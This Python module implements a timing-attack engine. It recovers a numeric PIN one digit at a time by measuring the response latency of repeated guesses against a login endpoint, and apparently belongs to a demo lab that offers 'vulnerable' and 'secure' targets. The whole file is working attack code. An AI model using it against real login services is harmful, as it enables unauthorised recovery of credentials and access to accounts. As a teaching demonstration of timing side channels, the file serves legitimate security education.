"""Timing-attack engine: recovers a PIN character-by-character by measuring
response latency against the login endpoint (vulnerable or secure)."""
import time
import requests
from typing import Callable, Dict, Optional

from .stats import median_time, best_candidate, signal_strength

CHARSET = "0123456789"


class TimingAttack:
    def __init__(
        self,
        base_url: str,
        session_id: str,
        target: str = "vulnerable",
        pin_length: int = 6,
        samples: int = 15,
        use_server_time: bool = False,
        charset: str = CHARSET,
        on_progress: Optional[Callable[[dict], None]] = None,
    ):
        self.base_url = base_url.rstrip("/")
        self.session_id = session_id
        self.target = target
        self.pin_length = pin_length
        self.samples = samples
        self.use_server_time = use_server_time
        self.charset = charset
        self.on_progress = on_progress

        self.recovered = ""
        self.total_requests = 0
        self.status = "running"

    def _endpoint(self) -> str:
        return f"{self.base_url}/api/login/{self.target}"

    def _measure_once(self, guess: str) -> float:
        """Send one guess, return the timing signal in microseconds."""
        t0 = time.perf_counter()
        resp = requests.post(self._endpoint(), json={
            "session_id": self.session_id,
            "guess": guess,
        })
        rtt_us = (time.perf_counter() - t0) * 1_000_000
        self.total_requests += 1

        if self.use_server_time:
            data = resp.json()
            server_us = data.get("server_time_us")
            if server_us is not None:
                return server_us
        return rtt_us

    def _measure_candidate(self, prefix: str, candidate: str) -> float:
        """Build a full-length guess with known prefix + candidate + padding,
        sample it `self.samples` times, and return the median timing."""
        pad_len = self.pin_length - len(prefix) - 1
        guess = prefix + candidate + ("0" * pad_len)
        timings = [self._measure_once(guess) for _ in range(self.samples)]
        return median_time(timings)

    def run(self) -> dict:
        """Recover the PIN one digit at a time. Returns the final result dict
        matching the GET /api/attack/{attack_id} 'done' shape."""
        try:
            for position in range(self.pin_length):
                candidate_medians: Dict[str, float] = {}
                for digit in self.charset:
                    candidate_medians[digit] = self._measure_candidate(
                        self.recovered, digit
                    )

                guess_digit = best_candidate(candidate_medians)
                self.recovered += guess_digit

                if self.on_progress:
                    self.on_progress({
                        "status": "running",
                        "position": position,
                        "recovered_so_far": self.recovered,
                        "candidate_medians_us": candidate_medians,
                        "total_requests": self.total_requests,
                        "signal_strength_us": signal_strength(candidate_medians),
                    })

            correct = self._verify()
            self.status = "done"
            return {
                "status": "done",
                "recovered": self.recovered,
                "correct": correct,
                "total_requests": self.total_requests,
            }

        except requests.RequestException as e:
            self.status = "failed"
            return {"status": "failed", "error": str(e)}

    def _verify(self) -> bool:
        """Final check: does the recovered PIN actually log in successfully?"""
        resp = requests.post(self._endpoint(), json={
            "session_id": self.session_id,
            "guess": self.recovered,
        })
        self.total_requests += 1
        return resp.status_code == 200